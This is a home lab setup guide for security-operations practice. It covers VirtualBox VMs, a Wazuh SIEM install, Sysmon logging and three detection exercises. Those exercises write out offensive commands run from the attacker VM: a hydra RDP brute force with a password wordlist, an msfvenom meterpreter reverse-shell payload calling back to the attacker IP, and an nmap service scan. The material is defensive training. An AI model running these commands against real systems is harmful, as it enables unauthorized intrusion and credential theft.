# 🏠 Home Lab Setup Guide

## Overview
A simple but effective home lab for SOC practice using free tools.

## Architecture

```
Your Machine (Host)
├── VirtualBox / VMware (Free)
│   ├── Kali Linux (Attacker)
│   ├── Ubuntu Server (Defender / SIEM)
│   └── Windows 10 (Victim)
└── Network: Host-Only or NAT Network
```

---

## Step 1: Install VirtualBox
Download from: https://www.virtualbox.org/

---

## Step 2: Download VMs

| VM | Purpose | Download |
|----|---------|----------|
| Kali Linux | Attack simulation | https://www.kali.org/get-kali/#kali-virtual-machines |
| Ubuntu 22.04 | SIEM / Wazuh | https://ubuntu.com/download/server |
| Windows 10 | Victim machine | https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/ |
| Metasploitable 2 | Vulnerable target | https://sourceforge.net/projects/metasploitable/ |

---

## Step 3: Install Wazuh (Free SIEM)

```bash
# On Ubuntu Server
curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
sudo bash ./wazuh-install.sh -a

# Access dashboard at: https://YOUR-IP:443
# Default user: admin
```

---

## Step 4: Install Sysmon on Windows (Better Logging)

```powershell
# Download Sysmon
# https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon

# Install with SwiftOnSecurity config (best practice config)
.\Sysmon64.exe -accepteula -i sysmonconfig.xml
```

Download config: https://github.com/SwiftOnSecurity/sysmon-config

---

## Step 5: Attack Scenarios to Practice

### Scenario 1: Brute Force Detection
```bash
# From Kali - attack Windows RDP
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://VICTIM-IP

# Then check: Did Wazuh alert? Did Windows Event 4625 show up?
```

### Scenario 2: Reverse Shell Detection
```bash
# From Kali - create payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=KALI-IP LPORT=4444 -f exe > shell.exe

# Then check: Network connections, process creation logs
```

### Scenario 3: Nmap Scan Detection
```bash
# From Kali
nmap -sV -sC VICTIM-IP

# Check: Did firewall/SIEM detect the scan?
```

---

## Resources
- TryHackMe SOC Path: https://tryhackme.com/path/outline/soclevel1
- LetsDefend: https://letsdefend.io/
- Blue Team Labs: https://blueteamlabs.online/
